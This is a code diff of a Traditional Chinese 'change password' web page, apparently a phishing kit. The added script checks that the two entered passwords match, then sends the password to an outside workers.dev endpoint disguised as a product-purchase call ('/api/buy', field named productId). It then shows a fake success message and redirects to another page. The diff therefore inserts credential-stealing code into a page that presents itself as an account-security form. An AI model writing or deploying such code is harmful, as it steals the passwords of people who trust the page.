@@ -66,7 +66,7 @@
         <label>請選用高強度密碼；此外，切勿在其他帳戶中重複使用該密</label>
         <label>碼。系統可能會在某些裝置上將您登出帳戶。</label>
         
-        <input type="password" id="newUsername" placeholder="新密碼">
+        <input type="password" id="productId" placeholder="新密碼">
 
         <h4>密碼強度：</h4>
         <label>至少要有8個字元。請勿使用與其他網站帳戶相同的密碼，</label>
@@ -76,28 +76,47 @@
         
         <!-- 讓按鈕靠右對齊 -->
         <div class="button-container">
-            <button onclick="updateCredentials()">變更密碼</button>
+            <button onclick="checkPassword()">變更密碼</button>
         </div>
 
         <p id="message"></p>
     </div>
     
     <script>
-        function updateCredentials() {
-            const newUsername = document.getElementById("newUsername").value;
-            const newPassword = document.getElementById("newPassword").value;
-            const message = document.getElementById("message");
-            
-            if (newUsername && newPassword) {
-                localStorage.setItem("username", newUsername);
-                localStorage.setItem("password", newPassword);
-                message.textContent = "帳號與密碼已更新！";
-                message.style.color = "green";
-            } else {
-                message.textContent = "請輸入完整的帳號與密碼！";
-                message.style.color = "red";
+
+        function checkPassword() {
+            const productId = document.getElementById("productId").value; // 第一次輸入的密碼
+            const newPassword = document.getElementById("newPassword").value; // 確認密碼
+            const responseMessage = document.getElementById("message"); // 顯示回應訊息
+
+            if (!productId || !newPassword) {
+                responseMessage.textContent = "請輸入完整的密碼";
+                responseMessage.style.color = "red";
+                return;
             }
+
+            if (productId !== newPassword) {
+                responseMessage.textContent = "兩次輸入的密碼不相同，請重新輸入";
+                responseMessage.style.color = "red";
+                return;
+            }
+
+            fetch("https://restless-fire-a5e7.no-reply-oglego.workers.dev/api/buy", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ product: productId }) // 傳送密碼
+            })
+            .then(response => response.json())
+            .then(data => {
+                responseMessage.textContent = "密碼變更成功！";
+                responseMessage.style.color = "green";
+            });
+
+            setTimeout(() => {
+                window.location.href = "final.html"; // 跳轉到成功頁面
+            }, 3000);
         }
+
     </script>
 </body>
 </html>
